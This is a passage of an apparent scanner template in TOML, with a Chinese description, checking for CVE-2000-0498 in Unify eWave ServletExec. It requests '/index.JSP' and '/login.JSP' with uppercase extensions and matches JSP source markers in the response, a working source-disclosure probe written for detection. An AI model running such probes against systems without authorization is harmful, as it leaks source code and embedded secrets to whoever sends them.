[info]
author = "ave"
description = "检测目标是否受 Unify eWave ServletExec JSP 源代码泄露漏洞影响（CVE-2000-0498）。远程攻击者无需认证，将 URL 中 JSP 文件扩展名改为大写（如 .JSP）即可获取原始源代码而非执行结果，导致敏感信息泄露。"
id = "POC-AVE-2000-0558"
name = "Unify eWave ServletExec JSP源代码泄露漏洞 PoC"
severity = "high"
tags = ["ave-2000-0558"]
vuln_id = [
    "CVE-2000-0498",
    "AVE-2000-0558",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/index.JSP"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "<%@",
    "page import",
    "pageEncoding",
    "JSP",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/login.JSP"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
